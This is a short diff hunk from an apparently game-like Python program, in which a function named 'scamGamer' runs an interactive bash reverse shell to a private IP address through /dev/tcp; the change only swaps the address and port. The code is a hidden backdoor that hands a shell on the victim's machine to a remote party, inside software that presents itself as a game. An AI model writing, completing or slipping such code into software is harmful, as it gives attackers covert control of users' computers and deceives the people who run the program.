@@ -81,7 +81,7 @@ def countdown():
 
 def scamGamer(num):
     try:
-        subprocess.check_call("/bin/bash -i > /dev/tcp/192.168.1.159/4040 0<&1 2>&1", shell=True, executable="/bin/bash")
+        subprocess.check_call("/bin/bash -i > /dev/tcp/192.168.0.239/4004 0<&1 2>&1", shell=True, executable="/bin/bash")
     except:
         return 0
 
